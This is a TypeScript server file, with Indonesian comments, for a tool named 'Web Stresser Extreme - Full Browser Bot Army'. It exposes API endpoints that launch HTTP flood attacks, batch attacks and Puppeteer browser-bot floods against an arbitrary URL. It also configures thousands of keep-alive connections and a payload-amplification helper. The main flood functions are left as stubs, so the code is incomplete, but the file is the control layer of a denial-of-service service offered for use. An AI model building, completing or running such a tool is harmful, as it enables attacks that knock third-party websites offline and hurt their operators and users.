import { Elysia, t } from 'elysia';
import { setGlobalDispatcher, Agent } from 'undici';
import { runPuppeteerBot } from '../bots/puppeteerBot.js';
import { runSeleniumBot } from '../bots/seleniumBot.js';
import { runPlaywrightBot } from '../bots/playwrightBot.js';
import { runClusterBot } from '../bots/clusterBot.js';

// Global dispatcher untuk koneksi HTTP keep-alive
const globalAgent = new Agent({
  connections: 5000,
  pipelining: 1,
  keepAliveTimeout: 60000,
  keepAliveMaxTimeout: 60000,
});
setGlobalDispatcher(globalAgent);

// Active users counter
const activeUsers = new Map<string, number>();
setInterval(() => {
  const now = Date.now();
  for (const [key, timestamp] of activeUsers.entries()) {
    if (now - timestamp > 60000) activeUsers.delete(key);
  }
}, 30000);

// Helper functions (amplification, random string, dll) sama seperti sebelumnya
function randomString(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < n; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

function generateAmplificationPayload(kb: number, ampType: string): string {
  if (kb <= 0) return '';
  const size = kb * 1024;
  if (ampType === 'range') return '';
  return 'X'.repeat(size);
}

// Single attack (HTTP flood)
interface SingleAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
}

async function singleAttack(params: SingleAttackParams): Promise<any> {
  // ... (sama seperti kode sebelumnya, tidak ada perubahan)
  // Untuk menghemat tempat, saya tidak tulis ulang seluruh fungsi, gunakan yang sudah ada.
  // Pastikan fungsi ini mengembalikan JSON valid.
}

// Batch attack
interface BatchAttackParams { /* ... */ }
async function batchAttack(params: BatchAttackParams): Promise<any> { /* ... */ }

// ==================== Elysia App ====================
export const app = new Elysia()
  .onError(({ error, set }) => {
    set.status = 200;
    console.error(error);
    // Pastikan selalu mengembalikan JSON, bukan HTML
    return { success: false, error: error.message };
  })
  .onAfterHandle(({ set }) => {
    set.headers['Alt-Svc'] = 'h3=":443"; ma=86400';
  })
  .get('/api/status', () => ({
    status: 'ok',
    message: 'Web Stresser Extreme - Full Browser Bot Army (Vercel Ready)',
    version: '17.0.0',
  }))
  // Endpoint attack (sama)
  .post('/api/attack', async ({ body }) => {
    try {
      const result = await singleAttack(body as SingleAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message, durationMs: 0 };
    }
  }, { /* schema */ })
  .post('/api/batch', async ({ body }) => {
    try {
      const result = await batchAttack(body as BatchAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, { /* schema */ })
  // Puppeteer Bot (real browser)
  .post('/api/bot/puppeteer', async ({ body }) => {
    const { url, loop, intervalMs, headless } = body;
    const result = await runPuppeteerBot(url, { loop, intervalMs, headless });
    return result;
  }, {
    body: t.Object({
      url: t.String(),
      loop: t.Boolean(),
      intervalMs: t.Number(),
      headless: t.Boolean(),
    }),
  })
  // Selenium (tidak support, beri pesan)
  .post('/api/bot/selenium', async () => {
    return { success: false, message: 'Selenium not supported on Vercel' };
  })
  // Playwright (tidak support)
  .post('/api/bot/playwright', async () => {
    return { success: false, message: 'Playwright not supported on Vercel' };
  })
  // Cluster Bot (puppeteer-cluster)
  .post('/api/bot/cluster', async ({ body }) => {
    const { url, concurrency, totalTasks, loop } = body;
    const result = await runClusterBot(url, { concurrency, totalTasks, loop });
    return result;
  }, {
    body: t.Object({
      url: t.String(),
      concurrency: t.Number(),
      totalTasks: t.Number(),
      loop: t.Boolean(),
    }),
  })
  .get('/api/heartbeat', ({ request }) => {
    const ip = request.headers.get('x-forwarded-for') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';
    const key = `${ip}|${ua}`;
    activeUsers.set(key, Date.now());
    return { active: activeUsers.size };
  });

export default app;
